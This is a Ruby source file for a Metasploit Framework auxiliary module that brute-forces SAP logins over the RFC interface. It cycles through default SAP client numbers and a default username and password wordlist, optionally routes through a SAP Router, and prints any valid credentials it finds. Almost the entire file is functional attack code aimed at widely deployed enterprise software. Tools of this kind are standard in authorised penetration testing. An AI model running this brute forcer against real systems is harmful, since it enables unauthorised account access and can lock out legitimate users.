##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[-] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include NWRFC

  def initialize
    super(
           'Name' => 'SAP RFC Brute Forcer',
           'Description' => %q{
				                          This module attempts to brute force the username | password via an RFC interface.
                                  Default clients can be tested without needing to set a CLIENT.
                                  Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USERPASS_FILE.
                                  The default usernames and password combinations are stored in ./data/wordlists/sap_default.txt.
                                  This module can execute through a SAP Router if SRHOST and SRPORT values are set.
                                  The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
				                 },
           'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
           'Author' => ['nmonkee'],
           'License' => MSF_LICENSE
           )

      register_options(
			[
			  Opt::RPORT(3300),
			  OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
			], self.class)
  end

  def run_host(ip)
    rport = datastore['rport'].to_s.split('')
    sysnr = rport[2]
    sysnr << rport[3]
    
    if datastore['CLIENT'].nil?
      print_status("Using default SAP client list")
      client = ['000','001','066']
    else
      client = []
        if datastore['CLIENT'] =~ /^\d{3},/
          client = datastore['CLIENT'].split(/,/)
          print_status("Brute forcing clients #{datastore['CLIENT']}")
        elsif datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
          array = datastore['CLIENT'].split(/-/)
          client = (array.at(0)..array.at(1)).to_a
          print_status("Brute forcing clients #{datastore['CLIENT']}")
        elsif datastore['CLIENT'] =~ /^\d{3}\z/
          client.push(datastore['CLIENT'])
          print_status("Brute forcing client #{datastore['CLIENT']}")
        else
          print_status("Invalid CLIENT - using default SAP client list instead")
          client = ['000','001','066']
        end
    end
    
    saptbl = Msf::Ui::Console::Table.new( Msf::Ui::Console::Table::Style::Default,
      'Header'  => "[SAP] Credentials",
      'Prefix'  => "\n",
      'Postfix' => "\n",
      'Indent'  => 1,
      'Columns' => ["host","port","client","user","pass"]
      )

    if datastore['USERPASS_FILE']
      file = datastore['USERPASS_FILE']
    else
      file = datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_default.txt'
    end

    credentials = extract_word_pair(file)
    credentials.each do |u,p|
      client.each do |cli|
        success = bruteforce(ip,u,p,cli,datastore['rport'],sysnr)
        saptbl << [ip,datastore['rport'],cli,u,p] if success
      end
    end
    
    print(saptbl.to_s)
  
  end

  def bruteforce(rhost,user,pass,client,rport,sysnr)
    ashost = rhost
    ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}" if datastore['SRHOST']
    begin
      auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
      conn = Connection.new(auth_hash)
      return true
    rescue NWError => e
      case e.message.to_s
      when /Name or password is incorrect/
        vprint_error("[SAP] #{rhost}:#{rport} - credentials incorrect - client: #{client} username: #{user} password: #{pass}") 
      when /not available in this system/
        vprint_error("[SAP] #{rhost}:#{rport} - client #{client} does not exist")
      when /Connection refused/
        print_error("[SAP] #{rhost}:#{rport} - communication failure (refused)")
      when /No route to host/
        print_error("[SAP] #{rhost}:#{rport} - communication failure (unreachable)")
      when /unknown/
        print_error("[SAP] #{rhost}:#{rport} - communication failure (hostname unknown)")
      when /Password logon no longer possible - too many failed attempts/
        print_error("[SAP] #{rhost}:#{rport} - #{user} locked in client #{client}")
      when /Password must be changed/
        return true
      end
    end
    return false
  end
end

